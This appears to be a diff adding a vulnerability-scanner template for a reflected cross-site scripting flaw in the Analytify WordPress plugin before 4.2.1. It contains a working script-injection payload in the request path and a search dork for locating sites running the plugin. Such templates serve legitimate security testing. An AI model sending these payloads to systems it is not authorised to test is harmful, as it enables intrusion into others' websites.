@@ -1,0 +1,35 @@
+id: analytify-plugin-xss
+info:
+  author: Akincibor
+  description: 'The plugin does not escape the current URL before outputting it back
+    in a 404 page when the 404 tracking feature is enabled, leading to Reflected Cross-Site
+    Scripting.
+
+    '
+  metadata:
+    google-dork: inurl:/wp-content/plugins/wp-analytify
+    verified: true
+  name: Analytify < 4.2.1 - Cross-Site Scripting
+  reference:
+  - https://wpscan.com/vulnerability/b8415ed5-6fd0-42fe-9201-73686c1871c5
+  severity: medium
+  tags: wp-plugin,xss,wp,wordpress,analytify
+requests:
+- matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - text/javascript">alert(/XSS/)</script>
+    - wp-analytify
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 404
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/aa404bb?a</script><script>alert(/XSS/)</script>'
